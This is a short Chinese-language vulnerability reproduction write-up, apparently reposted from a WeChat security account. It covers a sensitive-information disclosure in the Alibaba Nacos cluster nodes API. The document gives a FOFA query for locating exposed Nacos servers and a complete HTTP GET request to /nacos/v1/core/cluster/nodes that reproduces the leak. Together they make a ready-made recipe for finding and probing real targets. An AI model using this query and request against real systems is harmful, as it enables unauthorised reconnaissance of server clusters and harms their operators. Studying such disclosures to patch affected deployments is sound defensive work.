## 1. nacos nodes接口简介

微信公众号搜索：南风漏洞复现文库
该文章 南风漏洞复现文库 公众号首发

Alibaba Nacos

## 2.漏洞描述

nacos nodes接口存在敏感信息泄露漏洞

CVE编号:

CNNVD编号:

CNVD编号:

## 3.影响版本

Alibaba Nacos

![nacos nodes接口存在敏感信息泄露漏洞](Nacos%20nodes%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.assets/640.png)nacos nodes接口存在敏感信息泄露漏洞

## 4.fofa查询语句

app="Nacos"

## 5.漏洞复现

漏洞链接：http://xx.xx.xx.xx/nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword=

漏洞数据包：

```
GET /nacos/v1/core/cluster/nodes?withInstances=false&pageNo=1&pageSize=10&keyword= HTTP/1.1
Host: xxx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive

```

![图片](Nacos%20nodes%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.assets/640-1753839172166-3.jpeg)